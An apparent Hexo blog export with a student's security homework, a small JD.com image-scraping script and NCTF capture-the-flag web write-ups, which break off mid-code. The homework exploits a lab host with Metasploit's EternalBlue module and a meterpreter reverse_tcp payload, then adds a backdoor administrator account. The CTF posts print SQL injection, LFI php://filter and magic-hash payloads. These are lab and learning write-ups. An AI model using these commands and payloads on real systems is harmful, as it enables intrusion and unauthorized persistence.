<h2 id="2-攻击过程"><a href="#2-攻击过程" class="headerlink" title="2. 攻击过程"></a>2. 攻击过程</h2><h3 id="1-首先判断目标主机是否打开445端口"><a href="#1-首先判断目标主机是否打开445端口" class="headerlink" title="(1).首先判断目标主机是否打开445端口"></a>(1).首先判断目标主机是否打开445端口</h3><p>使用nmap+ip 扫描</p>
<p><img src="/2020/09/27/homework/4.png" srcset="/img/loading.gif" alt> </p>
<h3 id="2-确认目标主机打开445端口后直接使用msf进行攻击"><a href="#2-确认目标主机打开445端口后直接使用msf进行攻击" class="headerlink" title="(2) .确认目标主机打开445端口后直接使用msf进行攻击"></a>(2) .确认目标主机打开445端口后直接使用msf进行攻击</h3><p>输入msfconsole　启动ｍｓｆ</p>
<p>输入search　MS17-010</p>
<p>找到exploit windows/smb/ms17_010_eternalblue,</p>
<p>运行</p>
<div class="hljs"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> exploitwindows/smb/ms17_010_eternalblue</code></pre></div>

<p>输入 show options  查看需要配置哪些信息</p>
<p>RHOSTS 为目标主机IP(10.1.1.2)</p>
<p>RPORT 为目标端口号(445)</p>
<p>LHOST 为监听主机IP(10.1.1.1)</p>
<p><img src="/2020/09/27/homework/5.png" srcset="/img/loading.gif" alt> </p>
<p><img src="/2020/09/27/homework/6.png" srcset="/img/loading.gif" alt> </p>
<h3 id="3-配置成功后设置tcp连接"><a href="#3-配置成功后设置tcp连接" class="headerlink" title="(3). 配置成功后设置tcp连接"></a>(3). 配置成功后设置tcp连接</h3><p>输入命令</p>
<div class="hljs"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/x64/<span class="hljs-comment">meterpreter</span>/reverse_tcp</code></pre></div>



<h3 id="4-开始运行"><a href="#4-开始运行" class="headerlink" title="(4).开始运行"></a>(4).开始运行</h3><p>输入 exploit/run </p>
<p>成功获取shell</p>
<p> <img src="/2020/09/27/homework/8.png" srcset="/img/loading.gif" alt></p>
<p><img src="file:///C:%5CUsers%5CSunzh%5CAppData%5CLocal%5CTemp%5Cksohtml14056%5Cwps9.jpg" srcset="/img/loading.gif" alt="img"> </p>
<p>查看ip地址验证是否为目标主机。</p>
<h3 id="5-设立后门，在目标主机中创建一个用户"><a href="#5-设立后门，在目标主机中创建一个用户" class="headerlink" title="(5)设立后门，在目标主机中创建一个用户"></a>(5)设立后门，在目标主机中创建一个用户</h3><p>创建一个用户</p>
<div class="hljs"><pre><code class="hljs routeros">net<span class="hljs-built_in"> user </span>test abc123.com /add</code></pre></div>

<p>Username:test </p>
<p>password:abc123.com</p>
<p><img src="/2020/09/27/homework/9.png" srcset="/img/loading.gif" alt> </p>
<p>将该用户加入管理员组，使其拥有管理员权限</p>
<div class="hljs"><pre><code class="hljs dockerfile">net localgroup administrtors test /<span class="hljs-keyword">add</span></code></pre></div>

<p><img src="/2020/09/27/homework/10.png" srcset="/img/loading.gif" alt> </p>
<p>目标主机上用户创建成功</p>
<img src="/2020/09/27/homework/11.png" srcset="/img/loading.gif" style="zoom:70%;">





<p> <strong>实验结束</strong></p>
]]></content>
      <categories>
        <category>网安作业</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>jdtest</title>
    <url>/2020/07/18/jdtest/</url>
    <content><![CDATA[<h1 id="爬取京东商品图片的小测试"><a href="#爬取京东商品图片的小测试" class="headerlink" title="爬取京东商品图片的小测试"></a>爬取京东商品图片的小测试</h1><a id="more"></a>
<p>访问的页面<br><img src="/2020/07/18/jdtest/jd.png" srcset="/img/loading.gif" alt="1"><br>图片链接的位置<br><img src="/2020/07/18/jdtest/link.png" srcset="/img/loading.gif" alt="2"></p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/7/16 14:54</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : jd.py</span>

<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> os

dir = <span class="hljs-string">"jdtp"</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(dir):
    os.mkdir(dir)

baseurl = <span class="hljs-string">"https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu"</span>

head = &#123;
        <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61"</span>
    &#125;
response = requests.get(url=baseurl, headers = head)
<span class="hljs-comment">#print(response.text)</span>
html = response.text

findlinks = <span class="hljs-string">'&lt;img width="220" height="220" data-img="\d" src="(.*?)".*?&gt;'</span>
<span class="hljs-comment">#&lt;img width="220" height="220" data-img="1" src="//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg" data-lazy-img="done" source-data-lazy-img=""&gt;</span>
urls = re.findall(findlinks, html)

<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:
    time.sleep(<span class="hljs-number">1</span>)
    file_name = url.split(<span class="hljs-string">'/'</span>)[<span class="hljs-number">-1</span>]
    res = requests.get(<span class="hljs-string">"http:"</span>+url,headers = head)
    <span class="hljs-keyword">with</span> open(dir+<span class="hljs-string">'/'</span>+file_name, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:
        f.write(res.content)</code></pre></div>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>nctf-2</title>
    <url>/2020/09/02/nctf-2/</url>
    <content><![CDATA[<h1 id="NCTF-2"><a href="#NCTF-2" class="headerlink" title="NCTF-2"></a>NCTF-2</h1><a id="more"></a>

<h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p>题目源码给出</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;
    mysql_connect(SAE_MYSQL_HOST_M . <span class="hljs-string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = trim($_POST[user]);
  $pass = md5(trim($_POST[pass]));
  $sql=<span class="hljs-string">"select user from ctf where (user='"</span>.$user.<span class="hljs-string">"') and (pw='"</span>.$pass.<span class="hljs-string">"')"</span>;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;/br&gt;'</span>.$sql;
  $query = mysql_fetch_array(mysql_query($sql));
  <span class="hljs-keyword">if</span>($query[user]==<span class="hljs-string">"admin"</span>) &#123;
      <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;
  &#125;
  <span class="hljs-keyword">if</span>($query[user] != <span class="hljs-string">"admin"</span>) &#123;
    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);
  &#125;
&#125;
<span class="hljs-keyword">echo</span> $query[user];
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>首先post方法传递user和pass两个参数，然后带入sql语句中查询</p>
<p>注入点在这个位置</p>
<p><code>$sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;</code></p>
<p><code>select user from ctf where (user=&#39;&#39;) and (pw=&#39;&#39;)</code></p>
<p>构造语句</p>
<p><code>select user from ctf where (user=&#39;admin&#39;) or 1=1 #)   and (pw=&#39;&#39;)</code> </p>
<p>在username中填入<code>admin&#39;) or 1=1 #</code>或者<code>admin&#39;) and 1=1 #</code>，提交即可获得flag</p>
<p><img src="/2020/09/02/nctf-2/sql1.png" srcset="/img/loading.gif" alt></p>
<h2 id="passcheck"><a href="#passcheck" class="headerlink" title="passcheck"></a>passcheck</h2><div class="hljs"><pre><code class="hljs php">$pass=@$_POST[<span class="hljs-string">'pass'</span>];
$pass1=***********;<span class="hljs-comment">//被隐藏起来的密码</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($pass))
&#123;
<span class="hljs-keyword">if</span>(@!strcmp($pass,$pass1))&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"flag:nctf&#123;*&#125;"</span>;
&#125;<span class="hljs-keyword">else</span>&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"the pass is wrong!"</span>;
&#125;
&#125;<span class="hljs-keyword">else</span>&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"please input pass!"</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>strcmp() 函数比较两个字符串。</p>
<p><strong>注释：</strong>strcmp() 函数是二进制安全的，且对大小写敏感。</p>
<p><strong>提示：</strong>该函数与 <a href="https://www.w3school.com.cn/php/func_string_strncmp.asp" target="_blank" rel="noopener">strncmp()</a> 函数类似，不同的是，通过 strncmp() 您可以指定每个字符串用于比较的字符数。</p>
<p><img src="/2020/09/02/nctf-2/strcmp.png" srcset="/img/loading.gif" alt></p>
<p>只有pass==pass1时才显示flag</p>
<p>感觉跟之前的变量覆盖相似</p>
<p><img src="/2020/09/02/nctf-2/passcheck.png" srcset="/img/loading.gif" alt></p>
<p><strong>知识点：</strong><br>　　strcmp()函数 ：php5.3之前的strcmp的漏洞，当参数中的一个字符串是对象或者数组时，函数会返回0；<br>　　hackbar的使用，post方法<br>　　php弱类型，数组的使用。</p>
<p>参考： <a href="https://www.cnblogs.com/islsy/p/10667426.html" target="_blank" rel="noopener">https://www.cnblogs.com/islsy/p/10667426.html</a> </p>
<h2 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">noother_says_correct</span><span class="hljs-params">($number)</span></span>
<span class="hljs-function"></span>&#123;
       $one = ord(<span class="hljs-string">'1'</span>);
       $nine = ord(<span class="hljs-string">'9'</span>);
       <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; strlen($number); $i++)
       &#123;   
               $digit = ord($number&#123;$i&#125;);
               <span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) <span class="hljs-comment">//number中的数字不能在1-9</span>
               &#123;
                       <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
               &#125;
       &#125;
          <span class="hljs-keyword">return</span> $number == <span class="hljs-string">'54975581388'</span>; <span class="hljs-comment">//number的值等于54975581388，与之前if语句矛盾</span>
&#125;
$flag=<span class="hljs-string">'*******'</span>;
<span class="hljs-keyword">if</span>(noother_says_correct($_GET[<span class="hljs-string">'key'</span>]))
   <span class="hljs-keyword">echo</span> $flag;
<span class="hljs-keyword">else</span> 
   <span class="hljs-keyword">echo</span> <span class="hljs-string">'access denied'</span>;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>尝试将54975581388转成十六进制</p>
<p>0xccccccccc,  c的a值为12，满足if判断语句</p>
<p><code>?key=0xccccccccc</code></p>
<h2 id="sqlinject"><a href="#sqlinject" class="headerlink" title="sqlinject"></a>sqlinject</h2><p>查看源码</p>
<div class="hljs"><pre><code class="hljs php">&lt;!--
<span class="hljs-comment">#GOAL: login as admin,then get the flag;</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-keyword">require</span> <span class="hljs-string">'db.inc.php'</span>;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clean</span><span class="hljs-params">($str)</span></span>&#123;  
	<span class="hljs-keyword">if</span>(get_magic_quotes_gpc())&#123;  <span class="hljs-comment">//防止注入</span>
		$str=stripslashes($str); <span class="hljs-comment">//添加 \</span>
	&#125;
	<span class="hljs-keyword">return</span> htmlentities($str, ENT_QUOTES);<span class="hljs-comment">//过滤掉单引号，双引号，或者兼而有之</span>
&#125;

$username = @clean((string)$_GET[<span class="hljs-string">'username'</span>]);<span class="hljs-comment">//对获取的参数进行了处理</span>
$password = @clean((string)$_GET[<span class="hljs-string">'password'</span>]);

$query=<span class="hljs-string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="hljs-string">'\' AND pass=\''</span>.$password.<span class="hljs-string">'\';'</span>;<span class="hljs-comment">//存在注入的语句</span>
$result=mysql_query($query);
<span class="hljs-keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="hljs-number">1</span>)&#123;
	<span class="hljs-keyword">die</span>(<span class="hljs-string">'Invalid password!'</span>);
&#125;

<span class="hljs-keyword">echo</span> $flag;
--&gt;</code></pre></div>

<p> <strong>magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误</strong> </p>
<p> <code>SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;</code> </p>
<p> 反斜杠遇到单引号后，起到转义作用，实际sql语句如下</p>
<p><code>SELECT * FROM users WHERE name=&#39;.$username.&#39; AND pass=&#39;.$password.&#39;;</code> </p>
<p>这里注入与之前的注入不同，这里针对的是password</p>
<p><code>SELECT * FROM users WHERE name=&#39; \&#39; AND pass=&#39;  or 1=1 --+&#39;;</code></p>
<p><code>\&#39; AND pass=</code> 作为name 参数的值</p>
<p>所以构造?name=&amp;password=or 1=1 –+</p>
<p><img src="/2020/09/02/nctf-2/sql2.png" srcset="/img/loading.gif" alt></p>
<h2 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123; <span class="hljs-comment">//post 方式接收两个参数</span>
   mysql_connect(SAE_MYSQL_HOST_M . <span class="hljs-string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = $_POST[user];
  $pass = md5($_POST[pass]);<span class="hljs-comment">//对pass  md5加密</span>
  $query = @mysql_fetch_array(mysql_query(<span class="hljs-string">"select pw from ctf where user='$user'"</span>));<span class="hljs-comment">//获取pw字段的值</span>
  <span class="hljs-keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; <span class="hljs-comment">// 比较pass和pw</span>
      <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;
  &#125;
  <span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);
  &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>poyload:</p>
<p><code>user= &#39; union select md(1) &amp;pass=1</code></p>
<p><code>select pw from ctf where user=&#39;&#39; union select md(1)</code> </p>
<p>此查询语句获得我pw值为md(1),所以<code>if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw])))</code>语句成立，显示flag</p>
<p>(还没完全理解)</p>
<h2 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h2><p> 首页中给出很长的<code>jsfuck</code>，可以使用浏览器的<code>console</code>解码 ,给出一个页面</p>
<p>访问 <code>1bc29b36f623ba82aaf6724fd3b16718.php</code> </p>
<p><img src="/2020/09/02/nctf-2/ch2.png" srcset="/img/loading.gif" alt></p>
<p>提示在header里</p>
<p><img src="/2020/09/02/nctf-2/ch1.png" srcset="/img/loading.gif" alt></p>
<p>查看header</p>
<p><img src="/2020/09/02/nctf-2/ch.png" srcset="/img/loading.gif" alt></p>
<p> <code>history of bash</code>使用过linux的同志会知道，如果使用的是<code>bash</code>，在家目录中会生成<code>.bash_history</code>文件用来保存历史命令。<br>访问<code>.bash_history</code>文件，可以得到这样的历史命令 </p>
<p>url: <a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a> </p>
<p>获得<code>zip -r flagbak.zip ./*</code></p>
<p>访问 <a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</a></p>
<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><p>查看源码获取被注释的内容</p>
<div class="hljs"><pre><code class="hljs php">$file = $_GET[<span class="hljs-string">'file'</span>];
<span class="hljs-keyword">if</span>(@file_get_contents($file) == <span class="hljs-string">"meizijiu"</span>)&#123;
    <span class="hljs-keyword">echo</span> $nctf;
&#125;</code></pre></div>

<p>分析可得</p>
<p><strong>通过get方式传递<code>flle</code>=文件名</strong><br><strong>并且这个文件的内容==‘meizijiu’</strong><br><strong>如果等于就打印flag</strong> </p>
<p>php伪协议<code>php://input</code>来构造原始数据的只读流 </p>
<p><img src="/2020/09/02/nctf-2/file.png" srcset="/img/loading.gif" alt></p>
<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>参考 <a href="https://blog.csdn.net/niexinming/article/details/52637773?utm_source=blogxgwz1" target="_blank" rel="noopener">https://blog.csdn.net/niexinming/article/details/52637773?utm_source=blogxgwz1</a> </p>
<p>源码</p>
<div class="hljs"><pre><code class="hljs php">&lt;!--<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $key =&gt; $value)&#123;  
        $$key = $value;  
&#125;  
<span class="hljs-keyword">if</span>($name == <span class="hljs-string">"meizijiu233"</span>)&#123;
    <span class="hljs-keyword">echo</span> $flag;
&#125;--&gt;</code></pre></div>

<p><code>?name=meizijiu233</code></p>
<p><img src="/2020/09/02/nctf-2/fugai.png" srcset="/img/loading.gif" alt></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>弱类型</tag>
        <tag>php</tag>
        <tag>变量覆盖</tag>
      </tags>
  </entry>
  <entry>
    <title>nctf</title>
    <url>/2020/08/29/nctf/</url>
    <content><![CDATA[<h1 id="nctf-1"><a href="#nctf-1" class="headerlink" title="nctf-1"></a>nctf-1</h1><a id="more"></a>

<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>查看源码即可看到flag</p>
<h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>一道简单的md5漏洞题目</p>
<p><strong>md5函数漏洞</strong></p>
<p>源码</p>
<div class="hljs"><pre><code class="hljs php">$md51 = md5(<span class="hljs-string">'QNKCDZO'</span>);
$a = @$_GET[<span class="hljs-string">'a'</span>];
$md52 = @md5($a);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($a))&#123;
<span class="hljs-keyword">if</span> ($a != <span class="hljs-string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"nctf&#123;*****************&#125;"</span>;
&#125; <span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"false!!!"</span>;
&#125;&#125;
<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"please input a"</span>;&#125;</code></pre></div>

<p>即使用get方式传递一个参数a,使得a的值不等于<code>QNKCDZO</code>但是二者的md5值相同</p>
<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>常见的payload有</p>
<div class="hljs"><pre><code class="hljs c++">QNKCDZO
<span class="hljs-number">240610708</span>
s878926199a
s155964671a
s214587387a
s214587387a
 sha1(str)
sha1('aaroZmOk')  
sha1('aaK1STfY')
sha1('aaO8zKZF')
sha1('aa3OFF9m')</code></pre></div>

<h2 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h2><p>提示输入口令，尝试输入发现只能输入十个字母，但是口令有11个字母</p>
<p>F12审查元素，修改输入框的<code>maxlength</code>值，大于11即可</p>
<p><img src="/2020/08/29/nctf/qd1.png" srcset="/img/loading.gif" alt></p>
<p>再次输入口令即可。</p>
<p>考点为前端代码修改</p>
<h2 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h2><p>这道题还真不是web</p>
<p>进入题目链接，发现一张动图，本能的将其拖入动图查看器种，结果什么都没发现，于是打开winhex</p>
<p><img src="/2020/08/29/nctf/%E8%BF%99%E4%B8%8D%E6%98%AFweb.png" srcset="/img/loading.gif" alt></p>
<h2 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h2><p> 题目为层层递进，通过<strong>F12</strong>中<strong>Sources</strong>功能，查看网站的包含情况，发现到可疑地址：<code>SO.html</code>，查看发现相似可以地址，最后在<code>404.html</code>源码中得到<strong>flag</strong>（竖排插入在标签中）： </p>
<p><img src="/2020/08/29/nctf/%E5%B1%82%E5%B1%82%E9%80%92%E8%BF%9B.png" srcset="/img/loading.gif" alt></p>
<h2 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h2><p><strong>tip:在这里找key</strong></p>
<p>点击发现url改变，跳转到了另一个页面</p>
<p>bp抓包试试，go一下，相应包中出现flag</p>
<p><img src="/2020/08/29/nctf/ds1.png" srcset="/img/loading.gif" alt></p>
<h2 id="phpencode"><a href="#phpencode" class="headerlink" title="phpencode"></a>phpencode</h2><p>一开始以为是解码，结果发现代码逻辑不对，直接运行php代码，出错</p>
<p>将最后的<code>eval</code>改为<code>echo</code>,提交运行即可</p>
<p><img src="/2020/08/29/nctf/echo.png" srcset="/img/loading.gif" alt></p>
<p><img src="/2020/08/29/nctf/phpencode.png" srcset="/img/loading.gif" alt></p>
<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p> <strong>黑盒判断方法：<br>单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞。</strong> </p>
<p> 根据<strong>PHP伪协议</strong>尝试构造如下<strong>Payload：</strong><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code>，将<strong>index.php</strong>的源码经过<strong>Base64编码</strong>输出 </p>
<p><code>PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=</code></p>
<p>base64解码</p>
<div class="hljs"><pre><code class="hljs php+HTML">&lt;html&gt;
    &lt;title&gt;asdf&lt;&#x2F;title&gt;
&lt;?php
	error_reporting(0);
	if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;
	$file&#x3D;$_GET[&#39;file&#39;];
	if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
		echo &quot;Oh no!&quot;;
		exit();
	&#125;
	include($file); 
&#x2F;&#x2F;flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;
?&gt;
&lt;&#x2F;html&gt;</code></pre></div>

<h2 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h2><p>与单身二十年一样，抓包即可</p>
<p><img src="/2020/08/29/nctf/ds2.png" srcset="/img/loading.gif" alt></p>
<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p> <strong>Cookie，有时也用其复数形式 <a href="https://baike.baidu.com/item/Cookies/187064" target="_blank" rel="noopener">Cookies</a>。类型为“</strong>小型文本文件<strong>”，是某些网站为了辨别用户身份，进行<a href="https://baike.baidu.com/item/Session/479100" target="_blank" rel="noopener">Session</a>跟踪而储存在用户本地终端上的数据（通常经过加密），由用户<a href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>计算机暂时或永久保存的信息 。</strong></p>
<p> <strong>TIP: 0==not</strong> </p>
<p>bp抓包，将<code>cookie:login = 0</code>改<code>cookie:login=1</code> go</p>
<p><img src="/2020/08/29/nctf/cookie.png" srcset="/img/loading.gif" alt></p>
<h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p>进入题目，提示robots协议</p>
<p><strong>robots协议也叫robots.txt（统一小写）是一种存放于<a href="https://baike.baidu.com/item/网站" target="_blank" rel="noopener">网站</a>根目录下的<a href="https://baike.baidu.com/item/ASCII" target="_blank" rel="noopener">ASCII</a>编码的<a href="https://baike.baidu.com/item/文本文件" target="_blank" rel="noopener">文本文件</a>，它通常告诉网络<a href="https://baike.baidu.com/item/搜索引擎" target="_blank" rel="noopener">搜索引擎</a>的漫游器（又称<a href="https://baike.baidu.com/item/网络蜘蛛" target="_blank" rel="noopener">网络蜘蛛</a>），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots<a href="https://baike.baidu.com/item/元数据" target="_blank" rel="noopener">元数据</a>（Metadata，又称元数据）。</strong></p>
<p><strong>robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。</strong></p>
<p>查看robots.txt</p>
<p>url:<code>http://chinalover.sinaapp.com/web11/robots.txt</code></p>
<div class="hljs"><pre><code class="hljs php">TIP:sql.php
<span class="hljs-comment">//这里提示sql.php的源码如下</span></code></pre></div>

<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>($_GET[id]) &#123;
   mysql_connect(SAE_MYSQL_HOST_M . <span class="hljs-string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $id = intval($_GET[id]);
  $query = @mysql_fetch_array(mysql_query(<span class="hljs-string">"select content from ctf2 where id='$id'"</span>));
  <span class="hljs-keyword">if</span> ($_GET[id]==<span class="hljs-number">1024</span>) &#123;
      <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;
  &#125;
  <span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">echo</span>($query[content]);
  &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>大致意思：get方式传递一个id的参数,创建一个新的参数id存放取整后的值（intval()函数将参数变为整形）</p>
<p>之后将新的$id带入sql语句中查询。if语句中说明，get方式传递的值不能为1024。</p>
<p> <a href="http://chinalover.sinaapp.com/web11/sql.php?id=10" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web11/sql.php?id=10</a> 尝试id=10，无结果</p>
<p>id=1024出现 no! try again，说明只有id=1024的时候才会执行if语句</p>
<p>想到了intval()函数的作用，尝试id=1024.1</p>
<h2 id="GBK-Injection"><a href="#GBK-Injection" class="headerlink" title="GBK Injection"></a>GBK Injection</h2><p>宽字节注入，之前写过。</p>
<h2 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'nctf'</span>])) &#123;
       <span class="hljs-keyword">if</span> (@ereg (<span class="hljs-string">"^[1-9]+$"</span>, $_GET[<span class="hljs-string">'nctf'</span>]) === <span class="hljs-keyword">FALSE</span>)
           <span class="hljs-keyword">echo</span> <span class="hljs-string">'必须输入数字才行'</span>;
       <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'nctf'</span>], <span class="hljs-string">'#biubiubiu'</span>) !== <span class="hljs-keyword">FALSE</span>)   
           <span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);
       <span class="hljs-keyword">else</span>
